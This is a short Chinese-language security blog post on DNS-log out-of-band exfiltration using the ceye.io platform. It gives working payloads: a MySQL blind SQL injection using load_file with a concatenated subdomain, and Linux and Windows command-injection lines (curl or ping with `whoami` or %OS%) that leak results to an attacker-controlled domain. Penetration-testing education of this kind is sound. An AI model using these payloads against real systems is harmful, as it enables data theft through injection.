---
title: "利用 dnslog 回显"
date: 2018-02-10T00:00:00+08:00
draft: false
tags: ['sqli','windows','linux']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

DNS 在解析的时候会留下日志, 通过读取多级域名的解析日志, 来获取信息

简单来说就是把信息放在二级域名中, 传递到自己这, 然后读取日志, 获取信息

利用 dnslog 可以回显 sql 盲注的数据、命令执行的结果等

<!--more-->

知道创宇的 dnslog 平台

`ceye.io`

登录之后 右上角 Profile

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/06/1517915368.jpg)

Identifier 就是 dnslog 测试地址

访问 test.xxxx.ceye.io

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/06/1517915418.jpg)

后台 dnslog 记录

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/06/1517915447.jpg)

# SQL 盲注

以 mysql 为例

`load_file('\\\\xxxx.com\\')`

可以发起网络请求

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/06/1517915501.jpg)

记录

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/06/1517915511.jpg)

盲注

`and if((select load_file(concat('\\\\',(PAYLOAD),'.xxoo.ceye.io\\abc'))),1,1)`

因为不能直接 id=1 and select xxx 就用 if 来执行

PAYLOAD 记得写上 limit

# 命令执行

## linux

执行反引号内的内容并作为结果输出

`curl [反引号]whoami[反引号].xxxx.ceye.io`

`ping [反引号]whoami[反引号].xxxx.ceye.io`

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/06/1517915697.jpg)

dnslog

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/02/06/1517915704.jpg)

## windows

感觉鸡肋啊…

`ping %OS%.xxoo.ceye.io`

`%OS% 操作系统名称`